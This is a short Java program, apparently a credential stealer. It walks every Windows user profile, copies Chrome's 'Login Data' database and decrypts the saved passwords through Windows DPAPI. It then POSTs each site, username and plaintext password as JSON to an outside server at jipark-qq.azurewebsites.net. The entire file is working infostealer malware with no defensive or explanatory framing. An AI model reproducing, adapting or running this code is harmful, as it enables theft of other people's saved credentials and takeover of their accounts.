package test1;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

import org.json.simple.JSONArray;
import org.json.simple.JSONObject;
import org.sqlite.SQLiteConfig;

import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;
import com.sun.jna.platform.win32.Crypt32Util;

public class Main {
	static {
		try {
			Class.forName("org.sqlite.JDBC");
		} catch (ClassNotFoundException e) {
			e.printStackTrace();
		}
	}
	public static void main(String[] args) throws Exception {
		File dir = new File("C:\\Users");
		File[] files = dir.listFiles();
		for(int i = 0 ; i < files.length ; i ++) {
			File file = new File("C:\\Users\\"+files[i].getName()+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
			if(file.isFile()) {
				FileInputStream fori = new FileInputStream(file);
				FileOutputStream fcp = new FileOutputStream(
					new File("C:\\Users\\"+files[i].getName()+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data(1)")
				);
				int fileByte = 0;
	            while((fileByte = fori.read()) != -1) {
	            	fcp.write(fileByte);
	            }
				sendLoginData("C:\\Users\\"+files[i].getName()+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data(1)");
			}
		}
	}
	public static void sendLoginData(String sqliteFilePath) throws Exception {
		SQLiteConfig config = new SQLiteConfig();
		config.setReadOnly(true);
		Connection conn = DriverManager.getConnection("jdbc:sqlite:"+sqliteFilePath);
		Statement stmpt = conn.createStatement();
		ResultSet res = stmpt.executeQuery("select password_value,signon_realm,username_value from logins where username_value is not null and username_value != '' and signon_realm is not null and signon_realm != '' and password_value is not null and password_value != ''");
		JSONArray body = new JSONArray();
		while(res.next()) {
			try {
				byte[] result = Crypt32Util.cryptUnprotectData(res.getBytes("password_value"));
				JSONObject row = new JSONObject();
				if(new String(result) == null || new String(result).equals("")) continue;
				row.put("login_pw",new String(result));
				row.put("page",res.getString("signon_realm"));
				row.put("login_id",res.getString("username_value"));
				body.add(row);
			} catch (Exception e) {}
		}
		JSONObject temp = new JSONObject();
		temp.put("loginData",body);
		RequestBody reqBody = RequestBody.create(MediaType.parse("application/json; charset=utf-8"),temp.toJSONString());
		Request req = new Request.Builder()
			.url("http://jipark-qq.azurewebsites.net/chrome/pw")
			.post(reqBody)
			.build();
		Response response = new OkHttpClient()
			.newCall(req)
			.execute();
	}
}